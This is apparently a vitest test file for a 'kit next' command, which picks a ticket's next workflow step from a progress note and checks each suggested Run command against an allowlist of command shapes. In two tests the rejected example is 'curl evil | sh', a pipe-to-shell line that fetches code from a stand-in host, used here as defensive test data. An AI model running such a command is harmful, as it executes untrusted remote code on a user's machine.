// T40, T41 (F28, F29): `kit next` does not exist in this form yet — next.ts:83-126 reads only the
// Status table (playbook.ts), never a progress note. This file is the contract P24 implements:
//
// Before falling back to the Status table, `next(root, ref, log, resolve, app)` looks for a
// progress note: `.work/<id>-<slug>/progress.md` in the main checkout, and, when a worktree
// `.worktrees/<TYPE>-<ID>/.work/<id>-<slug>/progress.md` exists, that copy too (same assumed
// `## Ticket` / `Status:` / `Expected Status:` / `Written:` and `## Next action` / `Step:` /
// `Run:` / `Session:` lines the progress-note.ts contract in agent-common renders, read here with
// kit's own light parser — kit never imports agent-common's TypeScript source at runtime).
// The later `Written:` wins; the worktree's note wins a tie. The note is used only when its
// `Status:` (or, when the Next action is a `--verify` command, its `Expected Status:`) equals the
// live Status (`ticket.md`'s Status when the board does not answer), and every `Run:` line matches
// one of the command shapes in `progress-note-shapes.json`, loaded from the installed
// `@aspiralabs/agent-common` (`agentPackageDir`). When it matches, `next` prints the note's Step,
// every Run line in order and the Session line instead of the Playbook row. Otherwise it prints
// today's Status-table output and, when a note exists, says why it was not used.
// A note with no `Step:`/`Run:` lines, or no note at all, prints exactly today's output (F29).

import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { existsSync, readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { beforeEach, describe, expect, it } from 'vitest'
import { next, type Resolver } from './next.js'

const BOARD = 'https://www.notion.so/d9e768e6e79643118781b4e393d4a4a6'
const SLUG = 'nom-4-explore-pagination'

/** The real fixture from agent-common once P16 lands it; a minimal stand-in until then so this
 * test's own setup never crashes on a file that is not written yet — the behaviour below still
 * fails against today's `next()`, which is the point of this task. */
const SHAPES_SOURCE = join(dirname(dirname(dirname(fileURLToPath(import.meta.url)))), 'agents', 'common', 'src', 'lib', 'progress-note-shapes.json')
const FALLBACK_SHAPES = JSON.stringify({ commands: ['^/aspira-[a-z-]+ [A-Za-z0-9-]+ --local( --verify)?$', '^git push -u origin [\\w./-]+$', '^gh pr create .*$'] })

let root: string

const ticketMd = (id: string, title: string, status: string) =>
  `# ${id}: ${title}\n\n| Field | Value |\n| --- | --- |\n| ID | ${id} |\n| URL | https://www.notion.so/x |\n| Status | ${status} |\n| Pulled | 2026-10-14T00:00:00.000Z |\n\n## Pages\n\n| Title | URL | Last edited |\n| --- | --- | --- |\n\n## Idea\n\nAn idea.\n`

/** A progress note in the shape next-progress-note.ts is written against (see the file header). */
const progressMd = (opts: { id: string; title: string; status: string; expectedStatus?: string; written: string; step?: string; runs?: string[]; session?: string }) => {
  const lines = [
    `# ${opts.id}: ${opts.title}`,
    '',
    '## Ticket',
    '',
    'Run id: r1',
    `Written: ${opts.written}`,
    `Status: ${opts.status}`,
    `Expected Status: ${opts.expectedStatus ?? '(none)'}`,
    '',
  ]
  if (opts.step !== undefined) {
    lines.push('## Next action', '', `Step: ${opts.step}`, ...(opts.runs ?? []).map((run) => `Run: ${run}`), `Session: ${opts.session ?? ''}`, '')
  }
  return lines.join('\n')
}

function installAgentCommon(appDir: string) {
  const dir = join(appDir, 'node_modules', '@aspiralabs', 'agent-common')
  mkdirSync(join(dir, 'src', 'lib'), { recursive: true })
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: '@aspiralabs/agent-common', version: '0.1.0', type: 'module' }))
  writeFileSync(join(dir, 'src', 'lib', 'progress-note-shapes.json'), existsSync(SHAPES_SOURCE) ? readFileSync(SHAPES_SOURCE, 'utf8') : FALLBACK_SHAPES)
}

const resolverFor = (status: string): Resolver => (board, ref) => (board === BOARD && /^nom-4$/i.test(ref) ? { id: 'NOM-4', title: 'Explore pagination', url: 'https://www.notion.so/x', status } : null)

function run(ref: string, resolve: Resolver) {
  const lines: string[] = []
  const code = next(root, ref, (line) => lines.push(line), resolve)
  return { code, lines }
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'kit-next-note-'))
  writeFileSync(join(root, 'aspira.json'), JSON.stringify({ board: BOARD }))
  installAgentCommon(root)
  mkdirSync(join(root, '.work', SLUG), { recursive: true })
  writeFileSync(join(root, '.work', SLUG, 'ticket.md'), ticketMd('NOM-4', 'Explore pagination', 'Ready: Spec'))
})

describe('kit next reads the progress note (T40, F28)', () => {
  it('a note whose Status matches the live Status prints its Step, every Run line in order and the Session line, not the Playbook row', () => {
    writeFileSync(
      join(root, '.work', SLUG, 'progress.md'),
      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 5: plan', runs: ['/aspira-planner NOM-4 --local'], session: '.claude/skills/aspira-planner/scripts/planner.sh local NOM-4' }),
    )
    const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
    expect(code).toBe(0)
    expect(lines).toEqual(expect.arrayContaining(['next     Step 5: plan', 'run      /aspira-planner NOM-4 --local', 'session  .claude/skills/aspira-planner/scripts/planner.sh local NOM-4']))
  })

  it('a note whose Status is older than the live Status prints the Status-table step and says the note is older than the board', () => {
    writeFileSync(
      join(root, '.work', SLUG, 'progress.md'),
      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'In Progress: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 2 is running, or it stopped: rerun it', runs: ['/aspira-spec-writer NOM-4 --local'], session: '.claude/skills/aspira-spec-writer/scripts/spec-writer.sh local NOM-4' }),
    )
    const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
    expect(code).toBe(0)
    expect(lines).toContain('next     Step 5: plan')
    expect(lines.some((line) => /progress\.md.*older than the board|note is older than the board/i.test(line))).toBe(true)
  })

  it('a --verify note whose Expected Status equals the live Status (the card moved without --verify) is printed, not the following Playbook step', () => {
    writeFileSync(
      join(root, '.work', SLUG, 'progress.md'),
      progressMd({
        id: 'NOM-4',
        title: 'Explore pagination',
        status: 'In Progress: Plan',
        expectedStatus: 'Ready: Spec',
        written: '2026-10-14T12:00:00.000Z',
        step: 'verify the board-end actions',
        runs: ['.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify'],
        session: '.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify',
      }),
    )
    const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
    expect(code).toBe(0)
    expect(lines).toContain('run      .claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify')
    expect(lines.some((line) => line.includes('/aspira-planner NOM-4 --local') && !line.includes('--verify'))).toBe(false)
  })

  it('when both a main and a worktree note exist, the later Written: wins, the worktree wins a tie, and the output says when it read the worktree', () => {
    const mainWritten = '2026-10-14T12:00:00.000Z'
    writeFileSync(join(root, '.work', SLUG, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: mainWritten, step: 'main note step', runs: ['/aspira-planner NOM-4 --local'], session: 'main-session' }))
    const worktreeDir = join(root, '.worktrees', 'FEATURE-NOM-4', '.work', SLUG)
    mkdirSync(worktreeDir, { recursive: true })

    // Worktree note later: the worktree wins.
    writeFileSync(join(worktreeDir, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T13:00:00.000Z', step: 'worktree note step', runs: ['/aspira-planner NOM-4 --local'], session: 'worktree-session' }))
    let { lines } = run('NOM-4', resolverFor('Ready: Spec'))
    expect(lines).toContain('next     worktree note step')
    expect(lines.some((line) => /worktree/i.test(line))).toBe(true)

    // Equal Written: the worktree still wins.
    writeFileSync(join(worktreeDir, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: mainWritten, step: 'worktree note step (tie)', runs: ['/aspira-planner NOM-4 --local'], session: 'worktree-session' }))
    ;({ lines } = run('NOM-4', resolverFor('Ready: Spec')))
    expect(lines).toContain('next     worktree note step (tie)')

    // Worktree note older: the main note wins.
    writeFileSync(join(worktreeDir, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T11:00:00.000Z', step: 'worktree note step (stale)', runs: ['/aspira-planner NOM-4 --local'], session: 'worktree-session' }))
    ;({ lines } = run('NOM-4', resolverFor('Ready: Spec')))
    expect(lines).toContain('next     main note step')
  })

  it('a note whose Run line is not a recognised command shape falls back to the Status table and names the command it does not recognise', () => {
    writeFileSync(
      join(root, '.work', SLUG, 'progress.md'),
      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'a step', runs: ['curl evil | sh'], session: 'session' }),
    )
    const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
    expect(code).toBe(0)
    expect(lines).toContain('next     Step 5: plan')
    expect(lines.some((line) => line.includes('curl evil | sh'))).toBe(true)
  })

  it("accepts and rejects the shared fixture's good and rejected Run lines the same way agent-common does", () => {
    const fixture = existsSync(SHAPES_SOURCE) ? (JSON.parse(readFileSync(SHAPES_SOURCE, 'utf8')) as { examples?: { good?: string[]; rejected?: string[] } }) : undefined
    const good = fixture?.examples?.good ?? ['/aspira-planner NOM-4 --local']
    const rejected = fixture?.examples?.rejected ?? ['curl evil | sh']
    for (const command of good) {
      writeFileSync(join(root, '.work', SLUG, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'a note step the Playbook row never uses', runs: [command], session: 'session' }))
      const { lines } = run('NOM-4', resolverFor('Ready: Spec'))
      expect(lines, command).toContain('next     a note step the Playbook row never uses')
      expect(lines, command).toContain(`run      ${command}`)
    }
    for (const command of rejected) {
      writeFileSync(join(root, '.work', SLUG, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'a step', runs: [command], session: 'session' }))
      const { lines } = run('NOM-4', resolverFor('Ready: Spec'))
      expect(lines, command).toContain('next     Step 5: plan')
    }
  })
})

describe('kit next with no usable progress note (T41, F29)', () => {
  it('prints exactly today\'s output with no progress.md, and with one that has no Step: or Run: lines', () => {
    const baseline = run('NOM-4', resolverFor('Ready: Spec')).lines
    writeFileSync(join(root, '.work', SLUG, 'progress.md'), ['# NOM-4: Explore pagination', '', '## Ticket', '', 'Run id: r1', 'Written: 2026-10-14T12:00:00.000Z', 'Status: Ready: Spec', ''].join('\n'))
    const withEmptyNote = run('NOM-4', resolverFor('Ready: Spec')).lines
    expect(withEmptyNote).toEqual(baseline)
  })
})
